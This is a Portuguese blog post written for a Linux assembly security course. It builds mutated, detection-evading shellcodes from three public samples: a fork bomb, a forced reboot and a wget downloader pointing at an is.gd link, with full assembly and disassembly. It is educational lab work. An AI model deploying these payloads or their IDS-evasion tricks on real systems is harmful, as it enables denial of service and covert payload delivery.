---
layout: post
title: SLAE - 6th Assignment - Polymorphic Shellcodes
date: '2013-04-21T19:33:00.001-03:00'
author: geyslan
tags: [slae, shellcode, linux, code, assembly, hacking, portuguese]
modified_time: '2013-08-22T17:24:25.700-03:00'
blogger_id: tag:blogger.com,1999:blog-2541885528459487831.post-1360412718652150375
blogger_orig_url: http://www.hackingbits.com/2013/04/slae-6th-assignment-polymorphic.html
---

*/\*<br>
Este post é uma sequência. Para melhor entendimento, vejam:<br>
[SLAE - 1st Assignment - Shell Bind TCP](/slae-1st-assignment-shell-bind-tcp.html)<br>
[Hacking do Dia - Shell Bind TCP Random Port](/hacking-do-dia-shell-bind-tcp-random.html)<br>
[SLAE - 2nd Assignment - Shell Reverse TCP](/slae-2nd-assignment-shell-reverse-tcp.html)<br>
[O menor do mundo? Yeah? So Beat the Bits!](/o-menor-do-mundo-yeah-so-beat-bits.html)<br>
[SLAE - 3rd Assignment - Caçando Ovos?](/slae-3rd-assignment-cacando-ovos.html)<br>
[SLAE - 4th Assignment - Encoding and Decoding Gollums](/slae-4th-assignment-encoding-and.html)<br>
[SLAE - 5th Assignment - Metasploit Shellcodes Analysis](/slae-5th-assignment-metasploit.html)<br>
\*/*

<!--more-->

*This blog post has been created for completing the requirements of the
SecurityTube Linux Assembly Expert certification:*

*[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)*

*Student ID: SLAE-237*

*Códigos deste post estão no [GitHub](https://github.com/geyslan/SLAE/tree/master/6th.assignment)*.

*Shell-Storm:<br>
[Tiny Execve Sh](http://shell-storm.org/shellcode/files/shellcode-841.php)<br>
[Insertion Decoder Shellcode](http://shell-storm.org/shellcode/files/shellcode-840.php)*

##Missão

Segue abaixo o determinado pelo Vivek para este assignment.

###6th assignment

- Criar versão polimórfica de três shellcodes do repositório Shell-Storm.
- As versões polimórficas não podem ser maiores que 150% do tamanho das versões
originais.
- Pontos adicionais para quem os construir com menor tamanho que o original.

##Polimorfismo! Mesmo?!

Antes de iniciar a missão, procurei me inteirar do que realmente seria um shellcode polimorfo.

> \- Google, você me ajuda?<br>
- "Yes 'master'! I have one great source for you".<br>
- (⊙\_◎) Qual?<br>
- "Polymorphic Shellcode Engine - CLET Team".<br>
- Oh, muito obrigado google. (⊙‿⊙)<br>
- "You're welcome! But I need your clicks..."<br>
- Você não me chamou de mestre, agora há pouco?<br>
- "Yes, but it's the world! Master? (oT-T)尸 CLICK ME NOW!".<br>
- Oh, diabos! (ノдヽ)<br>

Após essa calorosa, bilíngue e esquizofrênica discussão filosófica, li o
grandioso paper do CLET Team sobre a construção de um motor para criação de
shellcodes polimórficos.

Minha concepção a respeito do tema é de que um shellcode não deveria ser chamado
de polimorfo mesmo que um motor externo o altere inúmeras vezes. O termo
polimorfismo vai além do fato de que o payload foi alterado com este fim.
Vejamos a definição do dicionário
[priberam](http://www.priberam.pt/DLPO/default.aspx?pal=polimorfo).

> polimorfo |ó|<br>
(poli- + -morfo)<br>
adj.<br>
1. Que se apresenta sob diversas formas.<br>
Sujeito a variar de forma.<br>

No âmbito dos vírus, o vocábulo é empregado corretamente, haja vista o próprio
vírus se replicar e sua "cópia", mesmo que destinada a fim idêntico, ter sua
composição diferenciada.

Um shellcode se replica? Não! Cabe salientar que se uma praga qualquer, que se
replica com mutação, tem a capacidade de utilizar um shellcode (modificado ou
não), ELA (praga) é que tem a característica polimórfica.

O que vemos aos montes na internet são esses autoproclamados shellcodes
polimórficos que de polimórficos não tem nada, apenas, quem sabe, a capacidade
de evasão. Eu, portanto os chamo de mutated shellcodes, ora terem sido
modificados manualmente ou através de um motor externo como o
[ADMmutate](http://www.ktwo.ca/security.html).

Bom, mas essa é uma concepção minha.

Esta missão exige que a versão "mutated" não seja maior que 150% do original.
Isso é meio difícil de se conseguir, principalmente se o shellcode original já
tiver tamanho reduzido. E estamos falando de inserção de bytes lixo, inclusão de
NOPs, extrapolação do resultado de uma instrução em duas ou mais etc. Em suma, é
uma missão não factível! A não ser que eu escolhesse um shellcode gigante, mal
codificado, e dali fizesse o seu enxugamento. Contudo, o resultado não seria
capaz de evadir IPSs.

Vivek também pontuará por "mutated" shellcodes menores que o original. (︶︹︺) Not
going to happen. Melhor que sejam maiores e sirvam ao propósito.

*Let's begin.*

##1st shellcode - fork bomb

Original [here](http://shell-storm.org/shellcode/files/shellcode-214.php).

{% highlight asm %}
pop eax
int 0x80
jmp short
{% endhighlight %} [//]: # (_)

Temos acima um clássico fork [bomb](http://linux.die.net/man/2/fork) usando a
syscall \__NR_fork 2.

Modifiquemo-lo.

{% highlight asm %}
_start:
xor edi, edi
jmp $+3
db 0xe8
mov dl, 29
xchg edi, eax
sub eax, 27
int 0x80
jmp _start
{% endhighlight %} [//]: # (_)

Na versão mutated, utilizei o register EDI para salvar o valor 29 (\__NR_pause) e
posteriormente o copiar para EAX, quando então ele é subtraído, restando-lhe o
valor 2 da syscall fork. Fiz uso também da técnica de [false
disassembly](http://www.ouah.org/linux-anti-debugging.txt) (obfuscated assembly)
com a JMP sobre o byte E8 (opcode da instrução CALL). Vejam a saída do objdump.

{% highlight console %}
08048060 <_start>:
 8048060: 31 ff                 xor    edi,edi
 8048062: eb 01                 jmp    8048065 <_start+0x5>
 8048064: e8 b2 1d 97 83        call   8b9b9e1b <_end+0x83970dab>
 8048069: e8 1b cd 80 eb        call   f3854d89 <_end+0xeb80bd19>
 804806e: f1                    icebp
{% endhighlight %} [//]: # (_)

Se as ferramentas IDS/IPS não utilizarem uma análise profunda como a
[GetPC](http://skypher.com/wiki/index.php/Hacking/Shellcode/GetPC) ([Recursive
Traversal](http://resources.infosecinstitute.com/linear-sweep-vs-recursive-disassembling-algorithm/)),
a finalidade do shellcode não será identificada.

Original: 7 bytes<br>
Mutated: 15 bytes

*Next.*

##2nd shellcode - reboot

Original [here](http://shell-storm.org/shellcode/files/shellcode-639.php) (AT&T syntax).

{% highlight asm %}
mov    $0x24,%al
int    $0x80
xor    %eax,%eax
mov    $0x58,%al
mov    $0xfee1dead,%ebx
mov    $0x28121969,%ecx
mov    $0x1234567,%edx
int    $0x80
xor    %eax,%eax
mov    $0x1,%al
xor    %ebx,%ebx
int    $0x80
{% endhighlight %}

Desta vez modificaremos um shellcode que chama a syscall sync (para evitar perda
de arquivos) e a reboot.

Segue a versão modificada.

{% highlight asm %}
# void sync(void);
# sync()

sub edi, edi
jz $+3
db 0xe8
add edi, 36
xchg eax, edi
jmp $+3
db 0xe1
int 0x80

# int reboot(int magic, int magic2, int cmd, void *arg);
# reboot(0xfee1dead, 0x28121969, 0x1234567, not_used)

jmp $+3
db 0xff
push 0x29
pop ecx
jmp $+3
db 0x01
mov ebx, 0x1234567
mov edx, 0xffc29bca
xor edx, ebx

jnz $+3
db 0xe7
xchg ebx, edx
lea eax, [ecx+0x2f]
lea ecx, [ecx+0x28121940]
jmp $+4
db 0xe8, 0x01
int 0x80
{% endhighlight %} [//]: # (*)

O código faz o mesmo que o original, com a diferença de não usar a syscall exit.
Pensem comigo: se o sistema já estará em processo de reinicialização, para que
se preocupar em fechar o programa? ;)

Também utilizei a técnica da SUB reg, reg, para zerar o registrador, seguida de
uma JZ. Como a subtração sempre setará o ZF, sempre haverá o jump. Essa é mais
uma técnica que embaralha a detecção do shellcode. Podem perceber que também não
fiz uso dos valores imediatos corretos; eles são calculados durante a execução.
Outra técnica empregada foi a de permutar os registradores, confundindo cada vez
mais a identificação do objetivo do código.

Outro jump utilizado é a JNZ, logo após o XORing de EDX e EBX; como eles tem
valores diferentes, a ZF nunca será setada, condicionando a JNZ a sempre efetuar
o jump. ;)

Abaixo, a saída do objdump.

{% highlight console %}
08048060 <_start>:
 8048060:    29 ff                    sub    %edi,%edi
 8048062:    74 01                    je     8048065 <_start+0x5>
 8048064:    e8 83 c7 24 97           call   9f2947ec <_end+0x9724b754>
 8048069:    eb 01                    jmp    804806c <_start+0xc>
 804806b:    e1 cd                    loope  804803a <_start-0x26>
 804806d:    80 eb 01                 sub    $0x1,%bl
 8048070:    ff 6a 29                 ljmp   *0x29(%edx)
 8048073:    59                       pop    %ecx
 8048074:    eb 01                    jmp    8048077 <_start+0x17>
 8048076:    01 bb 67 45 23 01        add    %edi,0x1234567(%ebx)
 804807c:    ba ca 9b c2 ff           mov    $0xffc29bca,%edx
 8048081:    31 da                    xor    %ebx,%edx
 8048083:    75 01                    jne    8048086 <_start+0x26>
 8048085:    e7 87                    out    %eax,$0x87
 8048087:    da 8d 41 2f 8d 89        fimull -0x7672d0bf(%ebp)
 804808d:    40                       inc    %eax
 804808e:    19 12                    sbb    %edx,(%edx)
 8048090:    28 eb                    sub    %ch,%bl
 8048092:    02 e8                    add    %al,%ch
 8048094:    01 cd                    add    %ecx,%ebp
 8048096:    80                       .byte 0x80
{% endhighlight %} [//]: # (_)

Tem que ter um olho muito treinado! :D

Original: 33 bytes<br>
Mutated: 55 bytes

Antes do Next, leiam sobre os <s>easter eggs</s> [magic
numbers](http://en.wikipedia.org/wiki/Linus_Torvalds#Personal_life) <s>do Linus
Torvalds</s> usados na syscall reboot.

Next.

##3rd shellcode - execve wget

Original [here](http://shell-storm.org/shellcode/files/shellcode-611.php) (AT&T
syntax).

{% highlight asm %}
push   $0xb
pop    %eax
cltd   
push   %edx
push   $0x61616161
mov    %esp,%ecx
push   %edx
push   $0x74
push   $0x6567772f
push   $0x6e69622f
push   $0x7273752f
mov    %esp,%ebx
push   %edx
push   %ecx
push   %ebx
mov    %esp,%ecx
int    $0x80
inc    %eax
int    $0x80
{% endhighlight %}

Esse último payload faz uso da syscall execve para instanciar o wget e baixar o
arquivo desejado.

Seguindo as mesmas técnicas já mencionadas, segue a versão modificada.

{% highlight asm %}
# int execve(const char *path, char *const argv[], char *const envp[]);
# execve(["/usr/bin/wget", 0], [["/usr/bin/wget", 0], "url", 0], 0

jmp $+3
db 0xe8
sub ebx, ebx
jz $+3
db 0x83
mul ebx
mov ebp, -11

jmp $+3
db 0xe8
push 0x72456541
sub esi, esi
jz $+3
db 0x83
pop esi
push esi
xor esi, 0x3e1f4a25
push esi

jmp $+3
db 0x33
push 0x672e7369
mov [esp+12], eax
mov ecx, esp


# /usr/bin/wget

push 0x74
jmp $+3
db 0xe3
push 0x6567772f
jmp $+3
db 0x83
push 0x6e69622f
jmp $+3
db 0x33
push 0x7273752f
lea ebx, [esp]

jmp $+3
db 0x83
push eax
push ecx                # argv address
push ebx                # file name address
mov ecx, esp            # pointer to the file name and argv

neg ebp

xchg eax, ebp
jmp $+3
db 0x83
int 0x80
{% endhighlight %} [//]: # (*)

E abaixo, a saída do objdump.

{% highlight console %}
08048060 <_start>:
 8048060: eb 01                 jmp    8048063 <_start+0x3>
 8048062: e8 29 db 74 01        call   9795b90 <__bss_start+0x174cad0>
 8048067: 83 f7 e3              xor    edi,0xffffffe3
 804806a: bd f5 ff ff ff        mov    ebp,0xfffffff5
 804806f: eb 01                 jmp    8048072 <_start+0x12>
 8048071: e8 68 41 65 45        call   4d69c1de <__bss_start+0x4565311e>
 8048076: 72 29                 jb     80480a1 <_start+0x41>
 8048078: f6 74 01 83           div    BYTE PTR [ecx+eax*1-0x7d]
 804807c: 5e                    pop    esi
 804807d: 56                    push   esi
 804807e: 81 f6 25 4a 1f 3e     xor    esi,0x3e1f4a25
 8048084: 56                    push   esi
 8048085: eb 01                 jmp    8048088 <_start+0x28>
 8048087: 33 68 69              xor    ebp,DWORD PTR [eax+0x69]
 804808a: 73 2e                 jae    80480ba <_start+0x5a>
 804808c: 67 89 44 24           mov    DWORD PTR [si+0x24],eax
 8048090: 0c 89                 or     al,0x89
 8048092: e1 6a                 loope  80480fe <_start+0x9e>
 8048094: 74 eb                 je     8048081 <_start+0x21>
 8048096: 01 e3                 add    ebx,esp
 8048098: 68 2f 77 67 65        push   0x6567772f
 804809d: eb 01                 jmp    80480a0 <_start+0x40>
 804809f: 83 68 2f 62           sub    DWORD PTR [eax+0x2f],0x62
 80480a3: 69 6e eb 01 33 68 2f  imul   ebp,DWORD PTR [esi-0x15],0x2f683301
 80480aa: 75 73                 jne    804811f <_start+0xbf>
 80480ac: 72 8d                 jb     804803b <_start-0x25>
 80480ae: 1c 24                 sbb    al,0x24
 80480b0: eb 01                 jmp    80480b3 <_start+0x53>
 80480b2: 83 50 51 53           adc    DWORD PTR [eax+0x51],0x53
 80480b6: 89 e1                 mov    ecx,esp
 80480b8: f7 dd                 neg    ebp
 80480ba: 95                    xchg   ebp,eax
 80480bb: eb 01                 jmp    80480be <_start+0x5e>
 80480bd: 83 cd 80              or     ebp,0xffffff80
{% endhighlight %} [//]: # (_)

Bem diferente, não acham?

Ao rodar o payload, é feito o download de um arquivo; se vocês acompanharam os
posts desde o início, vão saber dizer o conteúdo dele. Façam isso! Aguardo
contato informando o respectivo conteúdo. E após descobrirem, aproveitem e
modifiquem-no para usar a url que quiserem.

Original: 42 bytes<br>
Mutated: 96 bytes

End.

##Accomplished

Atentem que poderíamos ter utilizado criptografia no próprio shellcode para
fortalecer a sua mutação; mas esse é o tema da sétima e última missão.

Vemo-nos lá!

o//

##Mais Informações

[SLAE - SecurityTube Linux Assembly Expert](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)<br>
[Get shellcode of the binary using objdump - Andrey Arapov](http://www.commandlinefu.com/commands/view/12151/get-shellcode-of-the-binary-using-objdump#comment)<br>
[Polymorphic Shellcode Engine - Phrack Vol. 0x0b, Issue 0x3d](http://www.phrack.org/issues.html?issue=61&id=9)<br>
[ADMmutate](http://www.ktwo.ca/security.html)<br>
[Linux Anti-debugging Techniques (Fooling the Debugger) - Silvio Cesare](http://www.ktwo.ca/security.html)<br>
[GetPC - Skypher](http://skypher.com/wiki/index.php/Hacking/Shellcode/GetPC)<br>
[Linear Sweep vs Recursive Disassembling Algorithm - InfoSec Institute](http://resources.infosecinstitute.com/linear-sweep-vs-recursive-disassembling-algorithm/)<br>
[Magic number (programming) - Wikipedia](http://en.wikipedia.org/wiki/Magic_number_(programming))<br>
[is.gd](http://is.gd/)<br>
